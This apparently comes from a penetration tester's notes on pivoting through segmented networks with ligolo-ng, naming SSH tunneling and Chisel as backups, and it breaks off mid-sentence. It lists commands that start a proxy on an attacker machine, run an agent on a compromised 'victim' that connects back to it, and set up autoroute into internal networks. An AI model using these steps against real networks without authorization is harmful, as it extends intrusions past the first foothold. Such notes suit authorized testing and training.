In time, due to network segmentation and routing tables, we might have a need to perform Pivoting, mainly ligolo-ng would be used at it is currently the most convenient and best tools available for our purpose, however SSH Tunneling and Chisel would also be included as backup shall ligolo-ng fail

-UIsing ligolo-ng for pivoting

First we need to initiate a proxy on our attacker machine:
```
sudo ./proxy -selfcert #default port is 11601, change by specifying -laddr 0.0.0.0:<port>
```
Next, we need to transfer agent to our victim, then we run:
```
./agent -connect <ip>:<port> -ignore-cert
```
Then we select session in proxy, then use autoroute to configure:
```
session
autoroute #if previously the proxy is not opened with sudo, this stage will fail as autoroute creates new network interface, which requires sudo privil
```